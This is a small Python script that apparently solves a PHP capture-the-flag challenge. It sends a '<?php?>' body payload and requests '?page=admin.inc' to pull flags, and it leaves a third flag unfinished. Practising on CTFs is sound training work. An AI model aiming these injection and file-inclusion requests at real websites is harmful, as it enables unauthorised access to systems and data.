# Run with
# poetry run python main.py <url>
import argparse
import requests
import re

from re import Match
from requests import Session, Response
from argparse import ArgumentParser, Namespace


pattern = r"(\^FLAG\^.*?\$FLAG\$)"


def parser() -> argparse.Namespace:
    parser: ArgumentParser = argparse.ArgumentParser(
        description="Script to exploit multiple PHP vulnerabilities and print flags",
    )
    parser.add_argument("url", metavar="url", help="challenge url")

    return parser.parse_args()


def find_flag(s: str) -> str:
    m: Match[str] | None = re.search(pattern, s)

    return m.group(1) if m else ""


def flag1(s: Session, url: str) -> str:
    payload: dict[str, str] = {"body": "<?php?>"}
    response: Response = s.post(url, data=payload)

    response.raise_for_status()

    return find_flag(response.text)


def flag2(s: Session, url: str) -> str:
    url = f"{url}/?page=admin.inc"
    response: Response = s.get(url)

    response.raise_for_status()

    return find_flag(response.text)


def main(url: str) -> None:
    s: Session = requests.Session()
    print("Flag 1:", flag1(s, url))

    print("Flag 2:", flag2(s, url))

    # flag 3 not yet done


if __name__ == "__main__":
    args: Namespace = parser()
    main(args.url)
